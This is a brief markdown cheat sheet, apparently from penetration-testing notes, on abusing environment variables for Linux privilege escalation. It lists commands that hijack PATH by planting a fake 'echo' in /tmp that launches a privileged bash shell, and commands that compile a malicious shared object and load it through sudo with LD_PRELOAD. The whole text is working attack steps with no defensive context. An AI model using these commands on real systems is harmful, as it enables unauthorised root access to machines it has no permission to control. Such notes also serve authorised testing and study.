# Environment Variables Abuse
## PATH Abuse
- `export PATH=/tmp:$PATH`
- `echo '/bin/bash -p' > /tmp/echo`

## LD_PRELOAD Abuse
- `gcc -fPIC -shared -o /tmp/exploit.so /tmp/exploit.c -nostartfiles`
- `sudo LD_PRELOAD=/tmp/exploit.so <command>`